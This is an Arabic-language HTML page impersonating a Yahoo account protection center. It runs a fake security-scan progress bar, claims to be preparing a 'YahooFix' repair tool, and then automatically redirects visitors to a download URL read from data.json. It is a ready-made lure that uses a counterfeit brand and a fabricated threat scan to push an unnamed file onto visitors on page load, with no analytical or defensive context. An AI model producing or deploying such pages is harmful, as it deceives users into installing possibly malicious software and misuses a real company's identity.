<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مركز حماية حسابات ياهو</title>
    <style>
        body { background: #f9f9f9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 450px; }
        .logo { width: 100px; margin-bottom: 20px; }
        .loader-bar { width: 100%; background: #eee; height: 10px; border-radius: 5px; margin: 20px 0; overflow: hidden; }
        .progress { width: 0%; height: 100%; background: #6001d2; transition: 0.3s; }
        h2 { color: #6001d2; margin-bottom: 10px; }
        p { color: #555; font-size: 14px; }
        .status { font-weight: bold; color: #6001d2; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" class="logo">
        <h2>فحص الأمان جارٍ...</h2>
        <p>يرجى الانتظار، نقوم بتحليل التهديدات وتجهيز أداة الإصلاح YahooFix لجهازك.</p>
        
        <div class="loader-bar">
            <div class="progress" id="prg"></div>
        </div>
        
        <div class="status" id="stat">جاري فحص النظام (0%)</div>
    </div>

    <script>
        let width = 0;
        const prg = document.getElementById('prg');
        const stat = document.getElementById('stat');

        // محاكاة عملية التحميل
        const interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                stat.innerText = "بدء تنزيل أداة الإصلاح فوراً...";
                
                // جلب رابط التنزيل من data.json وبدء التحميل
                fetch('./data.json').then(r => r.json()).then(data => {
                    window.location.href = data.download_url;
                });
            } else {
                width++;
                prg.style.width = width + '%';
                stat.innerText = `جاري تجهيز ملف الإصلاح (${width}%)`;
            }
        }, 50); // سرعة العداد (5 ثواني تقريباً للوصول لـ 100%)
    </script>
</body>
</html>
